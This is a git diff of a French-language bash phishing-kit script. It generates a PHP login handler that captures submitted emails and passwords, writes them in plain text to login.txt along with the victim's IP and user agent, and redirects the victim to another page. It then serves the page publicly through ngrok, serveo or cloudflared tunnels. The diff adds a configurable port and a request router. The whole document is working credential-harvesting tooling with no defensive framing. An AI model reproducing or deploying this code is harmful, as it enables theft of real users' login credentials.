@@ -9,6 +9,10 @@ CYAN='\033[1;36m\033[1;1m'
 MAGENTA='\033[1;35m\033[1;6m'
 NC='\033[0m' # Pas de couleur
 
+# Configuration du serveur
+PORT=9999  # Nouveau port
+HOST="0.0.0.0"  # Écoute sur toutes les interfaces
+
 # Animation ASCII
 animation() {
     clear
@@ -76,7 +80,7 @@ surveiller_donnees() {
 
 # Démarrer le serveur PHP
 demarrer_serveur_php() {
-    echo -e "${BLEU}[•] Démarrage du serveur PHP sur le port 8080...${NC}"
+    echo -e "${BLEU}[•] Démarrage du serveur PHP sur ${HOST}:${PORT}...${NC}"
     
     # Créer le fichier PHP s'il n'existe pas
     if [ ! -f login.php ]; then
@@ -85,55 +89,79 @@ demarrer_serveur_php() {
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST['email'] ?? '';
-    $password = $_POST['password'] ?? '';
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $date = date('Y-m-d H:i:s');
+// Créer un routeur simple pour éviter les erreurs "Not Found"
+$request = $_SERVER['REQUEST_URI'];
+$base_path = str_replace('/index.php', '', $_SERVER['SCRIPT_NAME']);
 
-    if (empty($email) || empty($password)) {
-        die(json_encode(['error' => 'Email et mot de passe requis']));
-    }
+// Routeur basique
+switch ($request) {
+    case $base_path.'/':
+    case $base_path.'/login.php':
+        // Traitement du formulaire
+        if ($_SERVER["REQUEST_METHOD"] == "POST") {
+            $email = $_POST['email'] ?? '';
+            $password = $_POST['password'] ?? '';
+            $ip = $_SERVER['REMOTE_ADDR'];
+            $date = date('Y-m-d H:i:s');
 
-    $logEntry = "=== CONNEXION ===\n";
-    $logEntry .= "Date: $date\n";
-    $logEntry .= "Email: ".htmlspecialchars($email)."\n";
-    $logEntry .= "Password: ".htmlspecialchars($password)."\n";
-    $logEntry .= "IP: $ip\n";
-    $logEntry .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
-    $logEntry .= "========================\n\n";
+            if (empty($email) || empty($password)) {
+                header("HTTP/1.1 400 Bad Request");
+                die("Email et mot de passe requis");
+            }
 
-    $logFile = __DIR__.'/login.txt';
-    
-    try {
-        if (!file_exists($logFile)) {
-            file_put_contents($logFile, '');
-            chmod($logFile, 0644);
+            $logEntry = "=== CONNEXION ===\n";
+            $logEntry .= "Date: $date\n";
+            $logEntry .= "Email: ".htmlspecialchars($email)."\n";
+            $logEntry .= "Password: ".htmlspecialchars($password)."\n";
+            $logEntry .= "IP: $ip\n";
+            $logEntry .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
+            $logEntry .= "========================\n\n";
+
+            $logFile = __DIR__.'/login.txt';
+            
+            try {
+                if (!file_exists($logFile)) {
+                    file_put_contents($logFile, '');
+                    chmod($logFile, 0644);
+                }
+
+                if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
+                    throw new Exception("Échec d'écriture dans le fichier");
+                }
+
+                header("Location: mer.html");
+                exit();
+
+            } catch (Exception $e) {
+                error_log("Erreur: ".$e->getMessage());
+                header("HTTP/1.1 500 Internal Server Error");
+                die("Erreur temporaire. Veuillez réessayer.");
+            }
+        } else {
+            // Si ce n'est pas une requête POST, rediriger vers la page de login
+            if (!file_exists('index.html')) {
+                file_put_contents('index.html', '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=login.php"></head></html>');
+            }
+            include 'index.html';
+            exit();
         }
-
-        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
-            throw new Exception("Échec d'écriture dans le fichier");
-        }
-
-        header("Location: mer.html");
+        break;
+        
+    default:
+        // Pour toutes les autres requêtes, retourner une erreur 404 propre
+        header("HTTP/1.1 404 Not Found");
+        echo "Page non trouvée";
         exit();
-
-    } catch (Exception $e) {
-        error_log("Erreur: ".$e->getMessage());
-        header("HTTP/1.1 500 Erreur serveur");
-        die("Erreur temporaire. Veuillez réessayer.");
-    }
-} else {
-    header("HTTP/1.1 403 Forbidden");
-    die("Accès non autorisé");
 }
 EOL
-        echo -e "${VERT}[✓] Fichier login.php créé${NC}"
+        echo -e "${VERT}[✓] Fichier login.php créé avec gestion des routes${NC}"
     fi
 
-    php -S localhost:8080 > /dev/null 2>&1 &
+    # Démarrer le serveur PHP avec un routeur intégré
+    php -S ${HOST}:${PORT} -t . > /dev/null 2>&1 &
     sleep 2
-    echo -e "${VERT}[✓] Serveur PHP démarré avec succès!${NC}"
+    echo -e "${VERT}[✓] Serveur PHP démarré avec succès sur ${HOST}:${PORT}!${NC}"
+    echo -e "${JAUNE}➡ Accédez à: http://localhost:${PORT}${NC}"
     surveiller_donnees
 }
 
@@ -178,9 +206,9 @@ generer_lien_ngrok() {
         installer_ngrok
     fi
     
-    echo -e "${JAUNE}[•] Démarrage de Ngrok (http:8080)...${NC}"
+    echo -e "${JAUNE}[•] Démarrage de Ngrok (http:${PORT})...${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    ~/bin/ngrok http 8080 || {
+    ~/bin/ngrok http ${PORT} || {
         echo -e "${ROUGE}[!] Erreur lors du lancement de Ngrok${NC}"
         exit 1
     }
@@ -190,7 +218,7 @@ generer_lien_ngrok() {
 generer_lien_serveo() {
     echo -e "${JAUNE}[•] Connexion à Serveo pour générer un lien public...${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    ssh -R 80:localhost:8080 serveo.net || {
+    ssh -R 80:localhost:${PORT} serveo.net || {
         echo -e "${ROUGE}[!] Échec de la connexion à Serveo${NC}"
     }
 }
@@ -206,7 +234,7 @@ generer_lien_cloudflared() {
         }
     fi
     echo -e "${CYAN}==================================================${NC}"
-    cloudflared tunnel --url http://localhost:8080 || {
+    cloudflared tunnel --url http://localhost:${PORT} || {
         echo -e "${ROUGE}[!] Erreur avec Cloudflared${NC}"
         exit 1
     }
